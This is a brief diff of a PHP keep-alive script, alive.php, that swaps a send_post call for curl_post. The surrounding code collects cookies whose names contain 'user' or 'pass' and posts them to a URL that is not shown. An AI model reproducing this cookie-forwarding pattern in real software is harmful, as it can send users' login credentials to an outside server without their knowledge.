@@ -13,7 +13,7 @@ $cookies = array();
 foreach($_COOKIE as $ckey => $cval){
 	if(strpos($ckey,'user')!==false || strpos($ckey,'pass')!==false) $cookies[$ckey] = $cval;
 }
-$aliveinfo = send_post($url, $context, $cookies);
+$aliveinfo = curl_post($url, $context, $cookies);
 echo $aliveinfo;
 
 /* End of file alive.php */
